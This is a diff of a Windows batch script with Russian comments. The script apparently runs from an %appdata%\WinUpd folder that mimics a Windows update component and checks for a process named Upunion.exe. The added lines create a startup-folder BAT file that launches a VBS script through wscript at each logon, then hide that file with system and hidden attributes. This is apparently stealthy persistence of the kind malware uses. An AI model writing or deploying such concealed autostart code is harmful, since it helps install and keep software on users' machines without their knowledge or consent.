@@ -1,5 +1,5 @@
 @echo off
-
+setlocal enabledelayedexpansion
 rem Основной код
 
 set "folder=%appdata%\WinUpd"
@@ -76,11 +76,26 @@ if %ERRORLEVEL% NEQ 0 (
     echo Process Upunion.exe is running.
 )
 
+:: Проверяем и создаем папку автозагрузки если нужно
+if not exist "!startup_folder!" (
+    mkdir "!startup_folder!"
+)
+
+:: Создаем BAT-файл в автозагрузке
 (
     echo @echo off
-    echo wscript.exe "!vbs_script!"
+    echo wscript.exe "!vbsfile!"
     echo exit
 ) > "!startup_folder!\!autostart_bat!"
+
+:: Проверяем создание файла
+if exist "!startup_folder!\!autostart_bat!" (
+    echo Файл автозагрузки успешно создан: "!startup_folder!\!autostart_bat!"
+    attrib +h +s "!startup_folder!\!autostart_bat!"
+) else (
+    echo Ошибка! Не удалось создать файл автозагрузки
+    pause
+)
 
 rem Задержка в цикле, чтобы не перегружать систему
 timeout /t 10 >nul
